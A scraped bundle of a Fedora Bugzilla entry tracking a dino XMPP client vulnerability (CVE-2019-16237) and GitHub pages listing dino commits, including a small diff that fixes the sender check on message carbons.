| | [Keywords](describekeywords.cgi): |  | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | None | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Fedora | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Fedora | | [Component:](describecomponents.cgi?product=Fedora "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | dino | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | rawhide | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | unspecified | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Randy Barlow | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Fedora Extras Quality Assurance | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | | TreeView+ | [depends on](buglist.cgi?bug_id=1751851&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1751851&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2019-09-12 17:14 UTC by Randy Barlow | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2019-09-20 01:33 UTC ([History](show_activity.cgi?id=1751851)) | | [CC List:](page.cgi?id=fields.html#cclist) | 1 user (show)  rbarlow | | Fixed In Version: | dino-0.0-0.13.20190912.git.a96c801.fc32 dino-0.0-0.13.20190912.git.a96c801.fc31 dino-0.0-0.12.20190912.git.a96c801.fc30 dino-0.0-0.12.20190912.git.a96c801.fc29 | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-09-18 00:03:03 UTC | | | Type: | Bug | | | Embargoed: |  | | | [Dependent Products:](page.cgi?id=fields.html#dependent_products "Other Products that are affected by this bug.") | Ember-CSI Red Hat Enterprise Virtualization Manager Red Hat OpenStack Service Telemetry Framework | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1751851#c0)  Randy Barlow    2019-09-12 17:14:06 UTC  ``` <https://nvd.nist.gov/vuln/detail/CVE-2019-16237>   ```  [Comment 1](show_bug.cgi?id=1751851#c1)  Randy Barlow    2019-09-12 17:23:54 UTC  ``` Fixed in <https://github.com/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363>   ```  [Comment 2](show_bug.cgi?id=1751851#c2)  Fedora Update System    2019-09-12 18:07:40 UTC  ``` FEDORA-2019-3d3bb765ca has been submitted as an update to Fedora 30. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-3d3bb765ca>   ```  [Comment 3](show_bug.cgi?id=1751851#c3)  Fedora Update System    2019-09-12 18:07:47 UTC  ``` FEDORA-2019-2555c77f63 has been submitted as an update to Fedora 31. <https://bodhi.fedoraproject.org/updates/FEDORA-2019-2555c77f63>   ```  [Comment 4](show_bug.cgi?id=1751851#c4)  Fedora Update System    2019-09-12 21:00:06 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc30 has been pushed to the Fedora 30 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-3d3bb765ca>   ```  [Comment 5](show_bug.cgi?id=1751851#c5)  Fedora Update System    2019-09-12 22:39:38 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc29 has been pushed to the Fedora 29 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-0eb6d51f81>   ```  [Comment 6](show_bug.cgi?id=1751851#c6)  Fedora Update System    2019-09-14 01:39:55 UTC  ``` dino-0.0-0.13.20190912.git.a96c801.fc31 has been pushed to the Fedora 31 testing repository. If problems still persist, please make note of it in this bug report. See [https://fedoraproject.org/wiki/QA:Updates_Testing](https://fedoraproject.org/wiki/QA%3AUpdates_Testing) for instructions on how to install test updates. You can provide feedback for this update here: <https://bodhi.fedoraproject.org/updates/FEDORA-2019-2555c77f63>   ```  [Comment 7](show_bug.cgi?id=1751851#c7)  Fedora Update System    2019-09-18 00:03:03 UTC  ``` dino-0.0-0.13.20190912.git.a96c801.fc31 has been pushed to the Fedora 31 stable repository. If problems still persist, please make note of it in this bug report.   ```  [Comment 8](show_bug.cgi?id=1751851#c8)  Fedora Update System    2019-09-20 01:22:06 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc30 has been pushed to the Fedora 30 stable repository. If problems still persist, please make note of it in this bug report.   ```  [Comment 9](show_bug.cgi?id=1751851#c9)  Fedora Update System    2019-09-20 01:33:48 UTC  ``` dino-0.0-0.12.20190912.git.a96c801.fc29 has been pushed to the Fedora 29 stable repository. If problems still persist, please make note of it in this bug report.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1751851&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from github.com_2de56a82_20250121_025941.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcompare%2F016ab2c1...a96c8014)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcompare%2F016ab2c1...a96c8014)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

[Permalink](https://github.com/dino/dino/compare/dino%3A016ab2c...dino%3Aa96c801)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
dino/dino

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
016ab2c1

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/dino/dino/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...a96c8014)

Could not load tags

Nothing to show

[{{ refName }}
default](/dino/dino/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...a96c8014)

 Loading

...

*head repository:*
dino/dino

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
a96c8014

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/dino/dino/compare/016ab2c1...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/dino/dino/compare/016ab2c1...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

* 11

  commits
* 46

  files changed
* 5

  contributors

### Commits on Sep 1, 2019

1. [Do not mark abstract class contstuctors public](/dino/dino/commit/48c2e7afa497acc2e75cf5673d0dcdaa8ba638a7)
    …

   ```
   Starting with Vala 0.45.1, it is an error to mark abstract class
   constructors public[0,1]. This commit removes three such
   declarations.

   fixes [#609](https://github.com/dino/dino/issues/609)

   [0] <https://gitlab.gnome.org/GNOME/vala/raw/master/NEWS>
   [1] <https://gitlab.gnome.org/GNOME/vala/issues/766>

   Signed-off-by: Randy Barlow <randy@electronsweatshop.com>
   ```

   [![@bowlofeggs](https://avatars.githubusercontent.com/u/354506?s=40&v=4)](/bowlofeggs) [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [bowlofeggs](/dino/dino/commits?author=bowlofeggs "View all commits by bowlofeggs")
   authored and
   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 1, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/48c2e7afa497acc2e75cf5673d0dcdaa8ba638a7)
   * Copy full SHA for 48c2e7a
   * [Browse repository at this point](/dino/dino/tree/48c2e7afa497acc2e75cf5673d0dcdaa8ba638a7)

   Copy the full SHA

    [48c2e7a](/dino/dino/commit/48c2e7afa497acc2e75cf5673d0dcdaa8ba638a7)View commit details

   Browse the repository at this point in the history

### Commits on Sep 2, 2019

1. [Include data forms in entity capabilities hash computation](/dino/dino/commit/ecb3e783b9fde0fc6164a8058531b0be54eb7ef0)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 2, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/ecb3e783b9fde0fc6164a8058531b0be54eb7ef0)
   * Copy full SHA for ecb3e78
   * [Browse repository at this point](/dino/dino/tree/ecb3e783b9fde0fc6164a8058531b0be54eb7ef0)

   Copy the full SHA

    [ecb3e78](/dino/dino/commit/ecb3e783b9fde0fc6164a8058531b0be54eb7ef0)View commit details

   Browse the repository at this point in the history

### Commits on Sep 9, 2019

1. [Add emoji button to chat input](/dino/dino/commit/9950742bf1903291c271619aea101b0e2f81d19c)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 9, 2019

   [1](/dino/dino/commit/9950742bf1903291c271619aea101b0e2f81d19c#comments)

   Configuration menu

   * [View commit details](/dino/dino/commit/9950742bf1903291c271619aea101b0e2f81d19c)
   * Copy full SHA for 9950742
   * [Browse repository at this point](/dino/dino/tree/9950742bf1903291c271619aea101b0e2f81d19c)

   Copy the full SHA

    [9950742](/dino/dino/commit/9950742bf1903291c271619aea101b0e2f81d19c)View commit details

   Browse the repository at this point in the history

### Commits on Sep 10, 2019

1. [Fix some warnings](/dino/dino/commit/d5d305193ce527f1cc3022c406de35d9a85d4ccb)
    …

   ```
   Instances of `RegexError` are just asserted as `assert_not_reached` as
   they cannot really fail except for allocation failure if the given regex
   is valid.
   ```

   [![@hrxi](https://avatars.githubusercontent.com/u/24882852?s=40&v=4)](/hrxi) [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [hrxi](/dino/dino/commits?author=hrxi "View all commits by hrxi")
   authored and
   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 10, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/d5d305193ce527f1cc3022c406de35d9a85d4ccb)
   * Copy full SHA for d5d3051
   * [Browse repository at this point](/dino/dino/tree/d5d305193ce527f1cc3022c406de35d9a85d4ccb)

   Copy the full SHA

    [d5d3051](/dino/dino/commit/d5d305193ce527f1cc3022c406de35d9a85d4ccb)View commit details

   Browse the repository at this point in the history
2. [fixup Fix some warnings](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 10, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)
   * Copy full SHA for bd7fde9
   * [Browse repository at this point](/dino/dino/tree/bd7fde99af3df59c5ec96184b2649b4308250b24)

   Copy the full SHA

    [bd7fde9](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)View commit details

   Browse the repository at this point in the history
3. [Fix check of source of a carbons message](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

   [![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

   [mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
   committed
   Sep 10, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)
   * Copy full SHA for e84f2c4
   * [Browse repository at this point](/dino/dino/tree/e84f2c49567e86d2a261ea264d65c4adc549c930)

   Copy the full SHA

    [e84f2c4](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)View commit details

   Browse the repository at this point in the history
4. [Fix check of source of MAM message](/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 10, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)
   * Copy full SHA for 307f16c
   * [Browse repository at this point](/dino/dino/tree/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)

   Copy the full SHA

    [307f16c](/dino/dino/commit/307f16cc86dd2b95aa02ab8a85110e4a2d5e7363)View commit details

   Browse the repository at this point in the history
5. [Check roster push authorization](/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9)

   [![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

   [mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
   committed
   Sep 10, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9)
   * Copy full SHA for dd33f5f
   * [Browse repository at this point](/dino/dino/tree/dd33f5f949248d87d34f399e8846d5ee5b8823d9)

   Copy the full SHA

    [dd33f5f](/dino/dino/commit/dd33f5f949248d87d34f399e8846d5ee5b8823d9)View commit details

   Browse the repository at this point in the history

### Commits on Sep 11, 2019

1. [Make TestCase protected for newer vala](/dino/dino/commit/2a70a4e83f8df7141672315504394295f1cdee3a)
    …

   ```
   Signed-off-by: Maxime “pep” Buquet <pep@bouah.net>
   ```

   [![@Ppjet6](https://avatars.githubusercontent.com/u/138302?s=40&v=4)](/Ppjet6) [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [Ppjet6](/dino/dino/commits?author=Ppjet6 "View all commits by Ppjet6")
   authored and
   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 11, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/2a70a4e83f8df7141672315504394295f1cdee3a)
   * Copy full SHA for 2a70a4e
   * [Browse repository at this point](/dino/dino/tree/2a70a4e83f8df7141672315504394295f1cdee3a)

   Copy the full SHA

    [2a70a4e](/dino/dino/commit/2a70a4e83f8df7141672315504394295f1cdee3a)View commit details

   Browse the repository at this point in the history
2. [Remove some use\_markup usages, put skeleton header into .ui file](/dino/dino/commit/43720d3d2fdf9d42771c6c0ae8bea5db8b33ca41)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 11, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/43720d3d2fdf9d42771c6c0ae8bea5db8b33ca41)
   * Copy full SHA for 43720d3
   * [Browse repository at this point](/dino/dino/tree/43720d3d2fdf9d42771c6c0ae8bea5db8b33ca41)

   Copy the full SHA

    [43720d3](/dino/dino/commit/43720d3d2fdf9d42771c6c0ae8bea5db8b33ca41)View commit details

   Browse the repository at this point in the history
3. [Load images in conversation summary in different thread](/dino/dino/commit/a96c80149fb214079f23924dfaec49bff9c02427)

   [![@fiaxh](https://avatars.githubusercontent.com/u/9932450?s=40&v=4)](/fiaxh)

   [fiaxh](/dino/dino/commits?author=fiaxh "View all commits by fiaxh")
   committed
   Sep 11, 2019

   Configuration menu

   * [View commit details](/dino/dino/commit/a96c80149fb214079f23924dfaec49bff9c02427)
   * Copy full SHA for a96c801
   * [Browse repository at this point](/dino/dino/tree/a96c80149fb214079f23924dfaec49bff9c02427)

   Copy the full SHA

    [a96c801](/dino/dino/commit/a96c80149fb214079f23924dfaec49bff9c02427)View commit details

   Browse the repository at this point in the history

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff 016ab2c1...a96c8014`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_44e79fc6_20250121_025938.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdino%2Fdino%2Fcommit%2Fe84f2c49567e86d2a261ea264d65c4adc549c930)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=dino%2Fdino)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dino](/dino)
/
**[dino](/dino/dino)**
Public

* [Notifications](/login?return_to=%2Fdino%2Fdino) You must be signed in to change notification settings
* [Fork
  249](/login?return_to=%2Fdino%2Fdino)
* [Star
   2.2k](/login?return_to=%2Fdino%2Fdino)

* [Code](/dino/dino)
* [Issues
  528](/dino/dino/issues)
* [Pull requests
  33](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects
  0](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

Additional navigation options

* [Code](/dino/dino)
* [Issues](/dino/dino/issues)
* [Pull requests](/dino/dino/pulls)
* [Actions](/dino/dino/actions)
* [Projects](/dino/dino/projects)
* [Wiki](/dino/dino/wiki)
* [Security](/dino/dino/security)
* [Insights](/dino/dino/pulse)

## Commit

[Permalink](/dino/dino/commit/e84f2c49567e86d2a261ea264d65c4adc549c930)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fix check of source of a carbons message

[Browse files](/dino/dino/tree/e84f2c49567e86d2a261ea264d65c4adc549c930)
Browse the repository at this point in the history

* Loading branch information

[![@mar-v-in](https://avatars.githubusercontent.com/u/994036?s=40&v=4)](/mar-v-in)

[mar-v-in](/dino/dino/commits?author=mar-v-in "View all commits by mar-v-in")
committed
Sep 10, 2019

1 parent
[bd7fde9](/dino/dino/commit/bd7fde99af3df59c5ec96184b2649b4308250b24)

commit e84f2c4

Showing
**1 changed file**
with
**2 additions**
and
**2 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

4 changes: 2 additions & 2 deletions

4
[xmpp-vala/src/module/xep/0280\_message\_carbons.vala](#diff-acfb817f08aac774de8a6f8296cd4a9471d4c30c32630b45ac4233b5fe899153 "xmpp-vala/src/module/xep/0280_message_carbons.vala")

Show comments

[View file](/dino/dino/blob/e84f2c49567e86d2a261ea264d65c4adc549c930/xmpp-vala/src/module/xep/0280_message_carbons.vala)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -52,9 +52,9 @@ public class ReceivedPipelineListener : StanzaListener<MessageStanza> { |
|  |  | StanzaNode? forwarded\_node = carbons\_node.get\_subnode("forwarded", "urn:xmpp:forward:0"); |
|  |  | if (forwarded\_node != null) { |
|  |  | StanzaNode? message\_node = forwarded\_node.get\_subnode("message", Xmpp.NS\_URI); |
|  |  | string? from\_attribute = message\_node.get\_attribute("from", Xmpp.NS\_URI); |
|  |  | // Any forwarded copies received by a Carbons-enabled client MUST be from that user's bare JID; any copies that do not meet this requirement MUST be ignored. |
|  |  | if (from\_attribute != null && from\_attribute == stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid.to\_string()) { |
|  |  | if (!message.from.equals(stream.get\_flag(Bind.Flag.IDENTITY).my\_jid.bare\_jid)) { |
|  |  | warning("Received alleged carbon message from %s, ignoring", message.from.to\_string()); |
